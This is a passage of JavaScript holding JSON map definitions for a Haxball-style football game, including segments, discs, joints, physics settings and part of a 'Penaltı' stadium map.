			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 97,
			"v1": 96,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 98,
			"v1": 99,
			"curve": 180,
			"color": "004077",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 99,
			"v1": 98,
			"curve": 180,
			"color": "004077",
			"bCoef": 0,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 100,
			"v1": 101,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 101,
			"v1": 102,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 102,
			"v1": 103,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 104,
			"v1": 105,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 106,
			"v1": 107,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 107,
			"v1": 108,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 108,
			"v1": 109,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 109,
			"v1": 110,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 110,
			"v1": 111,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 112,
			"v1": 113,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 113,
			"v1": 114,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 114,
			"v1": 115,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 115,
			"v1": 112,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 114,
			"v1": 116,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 116,
			"v1": 117,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 119,
			"v1": 118,
			"curve": 14.999999999999998,
			"color": "333333",
			"bCoef": -30,
			"curveF": 7.595754112725151
		},
		{
			"v0": 120,
			"v1": 121,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 121,
			"v1": 120,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 122,
			"v1": 123,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 123,
			"v1": 122,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 124,
			"v1": 125,
			"curve": 180,
			"color": "004077",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 125,
			"v1": 124,
			"curve": 180,
			"color": "004077",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 126,
			"v1": 127,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 128,
			"v1": 129,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 130,
			"v1": 131,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 131,
			"v1": 132,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 132,
			"v1": 133,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 133,
			"v1": 130,
			"color": "FFFFFF",
			"cMask": []
		},
		{
			"v0": 134,
			"v1": 135,
			"color": "C7E6BD",
			"cMask": []
		},
		{
			"v0": 135,
			"v1": 136,
			"color": "C7E6BD",
			"cMask": []
		},
		{
			"v0": 136,
			"v1": 137,
			"color": "C7E6BD",
			"cMask": []
		},
		{
			"v0": 137,
			"v1": 134,
			"color": "C7E6BD",
			"cMask": []
		},
		{
			"v0": 138,
			"v1": 139,
			"color": "C7E6BD",
			"cMask": []
		},
		{
			"v0": 140,
			"v1": 141,
			"color": "333333",
			"bCoef": -30
		},
		{
			"v0": 143,
			"v1": 142,
			"curve": 29.999999999999996,
			"color": "333333",
			"bCoef": -30,
			"curveF": 3.7320508075688776
		},
		{
			"v0": 144,
			"v1": 145,
			"curve": 14.999999999999998,
			"color": "333333",
			"bCoef": -30,
			"curveF": 7.595754112725151
		},
		{
			"v0": 146,
			"v1": 147,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 147,
			"v1": 146,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 148,
			"v1": 149,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 149,
			"v1": 148,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 150,
			"v1": 151,
			"curve": 180,
			"color": "004077",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 151,
			"v1": 150,
			"curve": 180,
			"color": "004077",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 152,
			"v1": 153,
			"curve": 14.999999999999998,
			"color": "333333",
			"bCoef": -30,
			"curveF": 7.595754112725151
		},
		{
			"v0": 154,
			"v1": 155,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 155,
			"v1": 154,
			"curve": 180,
			"color": "0648CC",
			"cMask": [],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 156,
			"v1": 157,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 157,
			"v1": 156,
			"curve": 180,
			"color": "08E6FF",
			"bCoef": -0.5,
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 158,
			"v1": 159,
			"curve": 180,
			"color": "004077",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 159,
			"v1": 158,
			"curve": 180,
			"color": "004077",
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"curveF": 6.123233995736766e-17
		},
		{
			"v0": 160,
			"v1": 161,
			"curve": 14.999999999999998,
			"color": "333333",
			"bCoef": -30,
			"curveF": 7.595754112725151
		},
		{
			"v0": 168,
			"v1": 170,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 169,
			"v1": 171,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 171,
			"v1": 170,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 166,
			"v1": 172,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 172,
			"v1": 173,
			"color": "ffffff",
			"trait": "none",
			"y": -210
		},
		{
			"v0": 173,
			"v1": 167,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 164,
			"v1": 174,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 174,
			"v1": 175,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 175,
			"v1": 165,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 163,
			"v1": 176,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 176,
			"v1": 177,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 177,
			"v1": 178,
			"color": "ffffff",
			"trait": "none"
		},
		{
			"v0": 179,
			"v1": 180,
			"curve": 0,
			"vis": true,
			"color": "FF6054",
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"x": -320
		},
		{
			"v0": 181,
			"v1": 182,
			"curve": 0,
			"vis": true,
			"color": "08E6FF",
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"x": -320
		},
		{
			"v0": 183,
			"v1": 184,
			"curve": 0,
			"vis": true,
			"color": "08E6FF",
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"x": -320
		},
		{
			"v0": 185,
			"v1": 186,
			"curve": 0,
			"vis": true,
			"color": "FF6054",
			"bCoef": -1,
			"cMask": [
				"wall"
			],
			"trait": "none",
			"x": -320
		},
		{
			"v0": 187,
			"v1": 188,
			"curve": 31.96709968097467,
			"color": "FF6054",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"v0": 188,
			"v1": 189,
			"curve": 40.706458296137676,
			"color": "FF6054",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"v0": 190,
			"v1": 191,
			"curve": -4.822059493222474,
			"color": "FF6054",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"v0": 192,
			"v1": 193,
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		},
		{
			"v0": 193,
			"v1": 194,
			"curve": 60.38700287661802,
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			]
		}
	],
	"planes": [
		{
			"normal": [
				0,
				1
			],
			"dist": -231.5,
			"_data": {
				"extremes": {
					"normal": [
						0,
						1
					],
					"dist": -231.5,
					"canvas_rect": [
						-652,
						-500,
						653,
						1051
					],
					"a": [
						-652,
						-231.5
					],
					"b": [
						653,
						-231.5
					]
				}
			}
		},
		{
			"normal": [
				1,
				0
			],
			"dist": -331.5,
			"cMask": [
				"red",
				"blue"
			],
			"_data": {
				"extremes": {
					"normal": [
						1,
						0
					],
					"dist": -331.5,
					"canvas_rect": [
						-652,
						-500,
						653,
						1051
					],
					"a": [
						-331.5,
						-500
					],
					"b": [
						-331.5,
						1051
					]
				}
			}
		},
		{
			"normal": [
				0,
				-1
			],
			"dist": -227,
			"cMask": [
				"red",
				"blue"
			],
			"_data": {
				"extremes": {
					"normal": [
						0,
						-1
					],
					"dist": -227,
					"canvas_rect": [
						-652,
						-500,
						653,
						1051
					],
					"a": [
						-652,
						227
					],
					"b": [
						653,
						227
					]
				}
			}
		},
		{
			"normal": [
				-1,
				0
			],
			"dist": -342,
			"cMask": [
				"red",
				"blue"
			],
			"_data": {
				"extremes": {
					"normal": [
						-1,
						0
					],
					"dist": -342,
					"canvas_rect": [
						-652,
						-500,
						653,
						1051
					],
					"a": [
						342,
						-500
					],
					"b": [
						342,
						1051
					]
				}
			}
		}
	],
	"goals": [],
	"discs": [
		{
			"radius": 0,
			"pos": [
				1,
				63
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				-11.99,
				-10
			]
		},
		{
			"radius": 0,
			"pos": [
				-54,
				20.5
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				0,
				-10
			]
		},
		{
			"radius": 0,
			"pos": [
				56,
				20.5
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				0,
				10
			]
		},
		{
			"radius": 0,
			"pos": [
				-54,
				-24.5
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				0,
				-10
			]
		},
		{
			"radius": 0,
			"pos": [
				56,
				-24.5
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				0,
				10
			]
		},
		{
			"radius": 0,
			"pos": [
				1,
				-64.5
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				11.99,
				10
			]
		},
		{
			"radius": 0,
			"pos": [
				1.6009523809523765,
				65.04603174603176
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				-13.1,
				-10
			]
		},
		{
			"radius": 0,
			"pos": [
				-55.38015873015877,
				21.163095238095252
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				0,
				-10
			]
		},
		{
			"radius": 0,
			"pos": [
				58.19920634920629,
				21.163095238095252
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				0,
				10
			]
		},
		{
			"radius": 0,
			"pos": [
				-55.38015873015877,
				-25.301190476190442
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				0,
				-10
			]
		},
		{
			"radius": 0,
			"pos": [
				58.19920634920629,
				-25.301190476190442
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				0,
				10
			]
		},
		{
			"radius": 0,
			"pos": [
				1.0095238095237618,
				-66.60277777777776
			],
			"color": "08E6FF",
			"cMask": [
				"wall"
			],
			"cGroup": [
				"wall"
			],
			"speed": [
				13.1,
				10
			]
		},
		{
			"radius": 0,
			"invMass": 0,
			"pos": [
				-331,
				-230
			],
			"color": "C7E6BD",
			"bCoef": 0,
			"cMask": [
				"red",
				"blue",
				"ball"
			]
		},
		{
			"radius": 0,
			"invMass": 0,
			"pos": [
				341,
				-230
			],
			"color": "C7E6BD",
			"bCoef": 0,
			"cMask": [
				"red",
				"blue",
				"ball"
			]
		},
		{
			"radius": 0,
			"invMass": 0,
			"pos": [
				341,
				225
			],
			"color": "C7E6BD",
			"bCoef": 0,
			"cMask": [
				"red",
				"blue",
				"ball"
			]
		},
		{
			"radius": 0,
			"invMass": 0,
			"pos": [
				-331,
				226
			],
			"color": "C7E6BD",
			"bCoef": 0,
			"cMask": [
				"red",
				"blue",
				"ball"
			]
		},
		{
			"radius": 0,
			"pos": [
				27,
				1018
			],
			"color": "FF6054",
			"cMask": [
				"ball"
			],
			"cGroup": [
				"red",
				"blue"
			],
			"speed": [
				0,
				0
			]
		},
		{
			"radius": 0,
			"pos": [
				-1,
				1018
			],
			"color": "FF6054",
			"cMask": [
				"ball"
			],
			"cGroup": [
				"red",
				"blue"
			],
			"speed": [
				0,
				0
			]
		},
		{
			"radius": 0,
			"pos": [
				-1,
				1051
			],
			"color": "08E6FF",
			"cMask": [
				"ball"
			],
			"cGroup": [
				"red",
				"blue"
			],
			"speed": [
				0,
				0
			]
		},
		{
			"radius": 0,
			"pos": [
				27,
				1051
			],
			"color": "08E6FF",
			"cMask": [
				"ball"
			],
			"cGroup": [
				"red",
				"blue"
			],
			"speed": [
				0,
				0
			]
		},
		{
			"radius": 0,
			"pos": [
				365,
				1025
			],
			"color": "FF6054",
			"bCoef": -1,
			"cMask": [
				"red",
				"blue"
			],
			"speed": [
				0,
				0
			]
		},
		{
			"radius": 0,
			"pos": [
				365,
				985
			],
			"color": "FF6054",
			"bCoef": -1,
			"cMask": [
				"red",
				"blue"
			],
			"speed": [
				0,
				0
			]
		},
		{
			"radius": 0,
			"pos": [
				390,
				1025
			],
			"color": "FF6054",
			"bCoef": -1,
			"cMask": [
				"red",
				"blue"
			],
			"speed": [
				0,
				0
			]
		}
	],
	"playerPhysics": {
		"bCoef": 0.35,
		"invMass": 1,
		"damping": 0.95,
		"acceleration": 0.12,
		"kickingDamping": 1,
		"kickStrength": 0.2
	},
	"ballPhysics": {
		"radius": 0,
		"bCoef": 1.1,
		"invMass": 0.999,
		"damping": 0.9999,
		"color": "C9F364"
	},
	"spawnDistance": 500,
	"traits": {},
	"joints": [
		{
			"d0": 4,
			"d1": 6,
			"strength": "rigid",
			"color": "08E6FF",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 5,
			"d1": 6,
			"strength": "rigid",
			"color": "08E6FF",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 3,
			"d1": 5,
			"strength": "rigid",
			"color": "08E6FF",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 1,
			"d1": 3,
			"strength": "rigid",
			"color": "08E6FF",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 1,
			"d1": 2,
			"strength": "rigid",
			"color": "08E6FF",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 2,
			"d1": 4,
			"strength": "rigid",
			"color": "08E6FF",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 4,
			"d1": 5,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 2,
			"d1": 3,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 1,
			"d1": 6,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 2,
			"d1": 6,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 1,
			"d1": 5,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 2,
			"d1": 5,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 1,
			"d1": 4,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 3,
			"d1": 6,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 3,
			"d1": 4,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 10,
			"d1": 12,
			"strength": "rigid",
			"color": "004077",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 11,
			"d1": 12,
			"strength": "rigid",
			"color": "004077",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 9,
			"d1": 11,
			"strength": "rigid",
			"color": "004077",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 7,
			"d1": 9,
			"strength": "rigid",
			"color": "004077",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 7,
			"d1": 8,
			"strength": "rigid",
			"color": "004077",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 8,
			"d1": 10,
			"strength": "rigid",
			"color": "004077",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 10,
			"d1": 11,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 8,
			"d1": 9,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 7,
			"d1": 12,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 8,
			"d1": 12,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 7,
			"d1": 11,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 8,
			"d1": 11,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 7,
			"d1": 10,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 9,
			"d1": 12,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 9,
			"d1": 10,
			"strength": "rigid",
			"color": "transparent",
			"length": null,
			"radius": 0,
			"damping": 1
		},
		{
			"d0": 15,
			"d1": 16,
			"strength": "rigid",
			"color": "ffffff",
			"length": null,
			"radius": 5
		},
		{
			"d0": 13,
			"d1": 16,
			"strength": "rigid",
			"color": "ffffff",
			"length": null,
			"radius": 5
		},
		{
			"d0": 13,
			"d1": 14,
			"strength": "rigid",
			"color": "ffffff",
			"length": null,
			"radius": 5
		},
		{
			"d0": 14,
			"d1": 15,
			"strength": "rigid",
			"color": "ffffff",
			"length": null,
			"radius": 5
		},
		"kasuj"
	],
	"redSpawnPoints": [],
	"blueSpawnPoints": []
}`;
RSRMap = false;
return mevkiMap;
}

function PenaltıMap() {
var PenaltıMap = `{
	"name": "AF | Penaltı",
	"width": 630,
	"height": 500,
	"spawnDistance": 200,
	"bg": { "type": "", "width": 0, "height": 0, "color": "303030" },
	"vertexes": [
		{
			"x": 200,
			"y": -280,
			"bCoef": 0,
			"cMask": [
				"blue"
			],
			"trait": "line",
			"curve": -90,
			"vis": true
		},
		{
			"x": 0,
			"y": -100,
			"trait": "line",
			"curve": 0
		},
		{
			"x": 200,
			"y": 280,
			"trait": "line",
			"curve": 90
		},
		{
			"x": 0,
			"y": 100,
			"trait": "line",
			"curve": 0
		},
		{
			"x": 170,
			"y": -340,
			"bCoef": 0,
			"trait": "line",
			"curve": -90
		},
		{
			"x": 200,
			"y": -310,
			"bCoef": 0,
			"trait": "line",
			"curve": -90
		},
		{
			"x": 170,
			"y": 340,
			"bCoef": 0,
			"trait": "line",
			"curve": 90
		},
		{
			"x": 200,
			"y": 310,
			"bCoef": 0,
			"trait": "line",
			"curve": 90
		},
		{
			"x": 190,
			"y": -100,
			"bCoef": 0,
			"cMask": [
				"blue"
			],
			"trait": "line",
			"p0": [
				210,
				100
			],
			"p1": [
				210,
				-100
			],
			"curve": -45
		},
		{
			"x": 190,
			"y": 100,
			"bCoef": 0,
			"cMask": [
				"blue"
			],
			"trait": "line",
			"p0": [
				210,
				100
			],
			"p1": [
				210,
				-100
			],
			"curve": -45
		},
		{
			"x": 0,
			"y": -340,
			"bCoef": -0.1,
			"cMask": [
				"red"
			],
			"trait": "line",
			"curve": 20,
			"vis": false,
			"color": "000000"
		},
		{
			"x": 0,
			"y": 340,
			"bCoef": -0.1,
			"cMask": [
				"red"
			],
			"trait": "line",
			"curve": 20,
			"vis": false,
			"color": "000000"
		},
		{
			"x": 0,
			"y": -2.8,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": 0,
			"y": 0.8,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": 0,
			"y": -2.8,
			"bCoef": 0,
			"trait": "line",
			"curve": 90
		},
		{
			"x": 0,
			"y": 0.8,
			"bCoef": 0,
			"trait": "line",
			"curve": 90
		},
		{
			"x": 0,
			"y": -2.8,
			"bCoef": 0,
			"trait": "line",
			"curve": -90
		},
		{
			"x": 0,
			"y": 0.8,
			"bCoef": 0,
			"trait": "line",
			"curve": -90
		},
		{
			"x": 0,
			"y": -2.8,
			"bCoef": 0,
			"trait": "line",
			"curve": -180
		},
		{
			"x": 0,
			"y": 0.8,
			"bCoef": 0,
			"trait": "line",
			"curve": -180
		},
		{
			"x": 0,
			"y": -2.8,
			"bCoef": 0,
			"trait": "line",
			"curve": 180
		},
		{
			"x": 0,
			"y": 0.8,
			"bCoef": 0,
			"trait": "line",
			"curve": 180
		},
		{
			"x": 0,
			"y": -340,
			"bCoef": 0,
			"cMask": [
				"blue"
			],
			"trait": "line",
			"color": "888888",
			"curve": 0
		},
		{
			"x": 0,
			"y": -100,
			"bCoef": 0,
			"cMask": [
				"blue"
			],
			"trait": "line",
			"color": "888888",
			"curve": 0
		},
		{
			"x": -222.5,
			"y": -340,
			"cMask": [
				"red",
				"blue"
			],
			"trait": "line",
			"curve": 0
		},
		{
			"x": 200,
			"y": -340,
			"cMask": [
				"red",
				"blue"
			],
			"trait": "line",
			"curve": 0
		},
		{
			"x": -222,
			"y": 340.5,
			"trait": "line",
			"curve": 0
		},
		{
			"x": 200,
			"y": 340,
			"trait": "line",
			"curve": 0
		},
		{
			"x": -222.5,
			"y": 340.5,
			"trait": "line",
			"curve": 0
		},
		{
			"x": 200,
			"y": -340,
			"trait": "line",
			"curve": 0
		},
		{
			"x": 200,
			"y": 340,
			"trait": "line",
			"curve": 0
		},
		{
			"x": 0,
			"y": 102,
			"bCoef": 0,
			"cMask": [
				"blue"
			],
			"trait": "line",
			"color": "888888",
			"curve": 0
		},
		{
			"x": 0,
			"y": 340,
			"bCoef": 0,
			"cMask": [
				"blue"
			],
			"trait": "line",
			"color": "888888",
			"curve": 0
		},
		{
			"x": 200,
			"y": -100.533340454,
			"bCoef": 0.1,
			"cMask": [
				"ball"
			],
			"trait": "goalNet"
		},
		{
			"x": 200,
			"y": 100,
			"bCoef": 0.1,
			"cMask": [
				"ball"
			],
			"trait": "goalNet"
		},
		{
			"x": -222.5,
			"y": 340.5,
			"cMask": [
				"red",
				"blue"
			],
			"trait": "line",
			"curve": 0
		},
		{
			"x": 200,
			"y": 340.5,
			"cMask": [
				"red",
				"blue"
			],
			"trait": "line",
			"curve": 0
		},
		{
			"x": -221.5,
			"y": -339.5,
			"trait": "line",
			"curve": 0
		},
		{
			"x": -221.5,
			"y": 340.5,
			"trait": "line",
			"curve": 0
		},
		{
			"x": 260,
			"y": -100,
			"bCoef": 0,
			"cMask": [
				"ball"
			],
			"cGroup": [
				"wall"
			],
			"trait": "goalNet",
			"vis": false,
			"curve": 0,
			"damping": 0.96,
			"strength": 0.1,
			"_length": 9
		},
		{
			"x": 260.5,
			"y": 103,
			"bCoef": 0,
			"cMask": [
				"ball"
			],
			"cGroup": [
				"wall"
			],
			"trait": "goalNet",
			"vis": false,
			"curve": 0,
			"damping": 0.96,
			"strength": 0.1,
			"_length": 9
		},
		{
			"x": 196,
			"y": 103,
			"bCoef": 0.1,
			"cMask": [
				"ball"
			],
			"cGroup": [
				"wall"
			],
			"trait": "goalNet"
		},
		{
			"x": 260,
			"y": 100,
			"bCoef": 0,
			"cMask": [
				"ball"
			],
			"cGroup": [
				"wall"
			],
			"trait": "goalNet",
			"damping": 0.96,
			"strength": 0.1,
			"_length": 9
		},
		{
			"x": 204,
			"y": -100,
			"bCoef": 0.1,
			"cMask": [
				"ball"
			],
			"cGroup": [
				"wall"
			],
			"trait": "goalNet"
		},
		{
			"x": 260,
			"y": -100,
			"bCoef": 0,
			"cMask": [
				"ball"
			],
			"cGroup": [
				"wall"
			],
			"trait": "goalNet",
			"damping": 0.96,
			"strength": 0.1,
			"_length": 9
		},
		{
			"x": -174.96000000000006,
			"y": -284.6016000000001,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": -201.78720000000007,
			"y": -215.78400000000008,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": -150.46560000000005,
			"y": -216.95040000000006,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": -188.95680000000007,
			"y": -248.44320000000008,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": -159.79680000000005,
			"y": -249.60960000000009,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": -121.30560000000004,
			"y": -218.11680000000007,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": -121.30560000000004,
			"y": -289.2672000000001,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": -55.987200000000016,
			"y": -289.2672000000001,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": -121.30560000000004,
			"y": -256.60800000000006,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"x": -82.81440000000002,
			"y": -256.60800000000006,
			"bCoef": 0,
			"trait": "line"
		}
	],
	"segments": [
		{
			"v0": 0,
			"v1": 1,
			"curve": -90,
			"color": "FFFFFF",
			"trait": "line"
		},
		{
			"v0": 2,
			"v1": 3,
			"curve": 90,
			"color": "FFFFFF",
			"trait": "line"
		},
		{
			"v0": 1,
			"v1": 3,
			"curve": 0,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line",
			"x": 80
		},
		{
			"v0": 4,
			"v1": 5,
			"curve": -90,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line"
		},
		{
			"v0": 6,
			"v1": 7,
			"curve": 90,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line"
		},
		{
			"v0": 8,
			"v1": 9,
			"curve": -19.445860328533975,
			"vis": false,
			"bCoef": 0,
			"cMask": [
				"blue"
			],
			"trait": "line",
			"x": 215,
			"p0": [
				210,
				100
			],
			"p1": [
				210,
				-100
			]
		},
		{
			"v0": 10,
			"v1": 11,
			"curve": 11.168835299858449,
			"vis": false,
			"bCoef": -0.1,
			"cMask": [
				"red"
			]
		},
		{
			"v0": 12,
			"v1": 13,
			"curve": 0,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line",
			"x": 0
		},
		{
			"v0": 14,
			"v1": 15,
			"curve": 90,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line",
			"x": 0
		},
		{
			"v0": 16,
			"v1": 17,
			"curve": -90,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line",
			"x": 0
		},
		{
			"v0": 18,
			"v1": 19,
			"curve": -180,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line",
			"x": 0
		},
		{
			"v0": 20,
			"v1": 21,
			"curve": 180,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line",
			"x": 0
		},
		{
			"v0": 24,
			"v1": 25,
			"curve": 0,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"red",
				"blue"
			],
			"trait": "line",
			"x": 80
		},
		{
			"v0": 29,
			"v1": 30,
			"curve": 0,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line",
			"x": 80
		},
		{
			"v0": 35,
			"v1": 36,
			"curve": 0,
			"vis": true,
